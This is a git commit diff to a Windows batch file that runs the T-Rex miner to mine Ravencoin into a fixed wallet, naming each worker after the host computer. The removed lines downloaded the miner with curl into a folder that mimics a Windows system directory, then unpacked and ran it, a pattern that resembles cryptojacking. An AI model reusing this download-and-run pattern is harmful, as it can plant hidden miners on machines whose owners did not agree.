625d3a638e833e0c81038eb1ea4c2a88bad3e3d1
lodio-999 <132812071+lodio-999@users.noreply.github.com>
2023-05-13 23:51:34 +0300

    Update rvn-pool.bat

--- rvn-pool.bat
+++ rvn-pool.bat
@@ -1,7 +1,2 @@
-@echo off
-cd %systemdrive%\programdata\windows
-curl https://trex-miner.com/download/t-rex-0.26.8-win.zip --output my.zip
-powershell -command "Expand-Archive my.zip "
-copy my\t-rex.exe .
 t-rex.exe -a kawpow -o stratum+tcp://rvn.2miners.com:6060 -u RTKJqEgZEwNLdAvuTS6eRMJYp52YmqYBj7.%ComputerName% -p x
 pause
